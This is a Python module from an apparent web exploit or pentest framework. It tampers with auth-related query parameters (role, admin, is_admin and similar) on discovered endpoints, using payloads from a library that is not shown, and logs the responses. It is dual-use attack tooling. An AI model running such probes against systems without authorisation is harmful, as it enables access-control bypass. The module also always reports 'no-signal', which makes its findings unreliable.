from __future__ import annotations
from urllib.parse import parse_qsl,urlsplit,urlencode,urlunsplit
from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads
class AuthBypassModule(ExploitModule):
    name="Auth Bypass"; category="auth"
    PARAMS={"role","admin","is_admin","authenticated","auth","user","username","access"}
    async def run(self,ctx):
        evidence=[]; probes=get_payloads(self.name)
        for endpoint in ctx.artifacts.get("recon.endpoints",[])[:60]:
            p=urlsplit(endpoint);params=parse_qsl(p.query,keep_blank_values=True)
            for idx,(name,_) in enumerate(params):
                if name.lower() not in self.PARAMS: continue
                for i,payload in enumerate(probes,1):
                    ctx.logger(f"[payload {i}/{len(probes)}] Auth Bypass: {payload}")
                    m=params.copy();m[idx]=(name,payload);probe=urlunsplit((p.scheme,p.netloc,p.path,urlencode(m),p.fragment))
                    try:
                        r=await ctx.http.request("GET",probe)
                        ctx.inspect_source(str(r.url),r.text,payload,i,r.headers.get("content-type",""))
                        evidence.append(f"{probe} -> {r.status_code}, {len(r.text)} bytes")
                    except Exception as exc:evidence.append(str(exc))
        return ExploitResult(self.name,"no-signal","Auth-bypass probes completed",evidence="\n".join(evidence[:20]))
